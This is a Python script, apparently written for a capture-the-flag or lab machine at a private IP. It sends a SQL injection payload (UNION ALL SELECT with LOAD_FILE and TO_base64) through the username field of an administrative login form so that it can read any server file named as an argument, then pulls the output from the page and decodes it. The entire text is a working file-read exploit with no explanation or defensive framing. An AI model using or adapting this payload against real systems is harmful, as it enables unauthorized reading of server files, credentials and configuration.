import re
import sys
import requests as r
import base64

url = 'http://10.10.11.101/administrative'
# injection = sys.argv[1]  # "version()"
injection = f"TO_base64(LOAD_FILE('{sys.argv[1]}'))"  # File Read
schema = ";"  # sys.argv[2]
data = f"uname=test'+UNION+ALL+select+1,{injection},3,4,5,6+{schema}--+-&password=test"
header = {"Content-Type": "application/x-www-form-urlencoded"}
rspn = r.post(url, data=data, headers=header)
res = []
try:
    res = re.findall(r'<h3 class="animation-slide-top">Welcome (.*?)</h3>', rspn.text.replace('\n', ''))[0]
except IndexError:
        print(rspn.text)
else:
    try:
        print(base64.b64decode(res).decode('UTF-8'))
    except Exception:
        print(res)